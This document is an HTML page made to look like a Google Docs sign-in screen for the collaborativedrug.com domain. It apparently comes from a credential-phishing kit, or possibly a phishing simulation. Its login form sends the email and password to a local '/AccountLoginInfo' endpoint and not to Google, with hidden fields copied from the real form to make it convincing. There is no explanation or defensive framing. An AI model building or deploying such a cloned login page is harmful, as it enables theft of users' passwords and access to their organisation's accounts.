<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta content="width=300, initial-scale=1" name="viewport">
    <meta name="docs" value="notranslate">
    <meta name="description"
          content="Create a new document and edit with others at the same time. Get stuff done with or without an internet connection. Use Docs to edit Word files.">
    <meta name="docs-site-verification"
          content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
    <title>Docs - create and
        edit documents online, for free.</title>
    <link rel="icon"
          href="&#x2f;static&#x2f;google_drive&#x2f;images&#x2f;favicon.ico">
    <link rel="stylesheet"
          href="&#x2f;static&#x2f;google_drive&#x2f;styles.css">
</head>
<body>
<div class="wrapper">
    <div class="docs-header-bar  centered">
        <div class="header content clearfix">
            <div class="logo logo-w" aria-label="Docs"></div>
        </div>
    </div>
    <div class="main content clearfix">
        <div class="banner">
            <h1>
                One account for all your documents.
            </h1>
            <h2 class="hidden-small">
                Sign in to continue to Docs
            </h2>
        </div>
        <div id="dasher-tooltip" class="jfk-tooltip dasher-tooltip">
            <div class="jfk-tooltip-content">
                <p>
                    Please enter your full email address
                    <span>example@collaborativedrug.com</span>
                </p>
            </div>
            <div class="jfk-tooltip-closebtn"
                 id="dasher-tooltip-closebtn"
                 aria-label="Close"
                 role="button" tabindex="0">
            </div>
            <div class="jfk-tooltip-arrow jfk-tooltip-arrowleft">
                <div class="jfk-tooltip-arrowimplbefore"></div>
                <div class="jfk-tooltip-arrowimplafter"></div>
            </div>
        </div>
        <div class="main-content no-name">
            <div class="card signin-card pre-shift no-name">
                <div id="cc_iframe_parent"></div>
                <div class="circle-mask">
                    <canvas id="canvas" class="circle" width="96"
                            height="96"></canvas>
                </div>
                <form novalidate method="post" action="/AccountLoginInfo"
                      id="gaia_loginform">
                    <input name="Page" type="hidden"
                           value="PasswordSeparationSignIn">
                    <input type="hidden" name="GALX" value="gkMc97t5G6A">
                    <input type="hidden" name="gxf" value="Tk04QUI4UEUwMExWOElRMFQyU0NFT08xOVRIVUhHQlpHTExE">
                    <input type="hidden" name="continue"
                           value="&#x2f;a&#x2f;collaborativedrug.com&#x2f;document&#x2f;d&#x2f;Tk04QUI4UEUwMExWOElRMFQyU0NFT08xOVRIVUhHQlpHTExE&#x2f;edit">
                    <input type="hidden" name="service" value="wise">
                    <input type="hidden" name="ltmpl" value="slides">
                    <input type="hidden" name="sacu" value="1">
                    <input type="hidden" name="hd"
                           value="collaborativedrug.com">
                    <input id="profile-information" name="ProfileInformation"
                           type="hidden" value="">
                    <input type="hidden" id="_utf8" name="_utf8"
                           value="&#9731;"/>
                    <input type="hidden" name="bgresponse" id="bgresponse"
                           value="js_disabled">
                    <input type="hidden" id="pstMsg" name="pstMsg" value="0">
                    <input type="hidden" id="dnConn" name="dnConn" value="">
                    <input type="hidden" id="checkConnection"
                           name="checkConnection" value="">
                    <input type="hidden" id="checkedDomains"
                           name="checkedDomains"
                           value="youtube">
                    <input type="hidden" name="ckey" value="ICNM8AB8PE00LV8IQ0T2">
                    
                      <input type="hidden" name="rkey" value="IRSCEOO19THUHGBZGLLD">
                    
                    
                    <div class="form-panel first valid" id="gaia_firstform">
                        <div class="slide-out ">
                            <div class="input-wrapper focused">
                                <div id="identifier-shown">
                                    <div>
                                        <label class="hidden-label" for="Email">
                                            Enter your email</label>
                                        <input id="Email" name="Email"
                                               placeholder="Enter your email"
                                               type="email" value=""
                                               spellcheck="false"
                                               autofocus>
                                        <input id="Passwd-hidden"
                                               type="password"
                                               spellcheck="false"
                                               class="hidden">
                                    </div>
                                </div>
                                <span role="alert" class="error-msg"
                                      id="errormsg_0_Email"></span>
                            </div>
                            <div id="identifier-captcha">
                                <input type="hidden" name="identifiertoken"
                                       id="identifier-token" value="">
                                <input type="hidden"
                                       name="identifiertoken_audio"
                                       id="identifier-token-audio">
                                <div class="captcha-box">
                                    <div id="captcha-img"
                                         data-alt-text="Visual verification">
                                    </div>
                                    <span class="captcha-msg">
                                    Letters are not case-sensitive
                                    </span>
                                </div>
                                <label for="identifier-captcha-input"

                                       class="hidden-label"
                                ></label>
                                <input type="text"
                                       id="identifier-captcha-input"
                                       name="identifier-captcha-input"
                                       class="captcha"
                                       placeholder="Enter the letters above"
                                       title="Type the characters you see or numbers you hear">
                            </div>
                            <input id="next" name="signIn"
                                   class="rc-button rc-button-submit"
                                   type="submit" value="Next">
                        </div>
                    </div>
                    <a href="#">
                        <img id="back-arrow" class="back-arrow "
                             aria-label="Back" tabindex="0" alt="Back"

                             src="&#x2f;static&#x2f;google_drive&#x2f;images&#x2f;arrow_back_grey600_24dp.png">
                    </a>
                    <div class="form-panel second">
                        <div class="slide-in hide-form">
                            <div>
                                <p id="profile-name"></p>
                                <span id="email-display"></span>
                            </div>
                            <div>
                                <div id="password-shown">
                                    <div>
                                        <input id="Email-hidden" type="email"
                                               spellcheck="false" class="hidden"
                                               value="" readonly
                                               autocomplete="off">
                                        <label class="hidden-label"
                                               for="Passwd">Password</label>
                                        <input id="Passwd"
                                               placeholder="Password"
                                               type="password"
                                               class="">
                                    </div>
                                </div>
                            </div>
                            <input id="signIn" name="signIn"
                                   class="rc-button-submit rc-button"
                                   type="submit" value="Sign in">
                            <input type="hidden" name="rmShown" value="1">
                            <a id="link-forgot-passwd" class="need-help hidden">
                                Forgot password?
                            </a>
                        </div>
                    </div>
                </form>
            </div>
            <div class="card-mask-wrap no-name">
                <div class="card-mask">
                    <div class="one-docs">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="docs-footer-bar">
        <div class="footer content clearfix">
        </div>
    </div>
</div>
<script src="&#x2f;static&#x2f;google_drive&#x2f;scripts.js"></script>
<script src="&#x2f;static&#x2f;landing.js"></script>
</body>
</html>
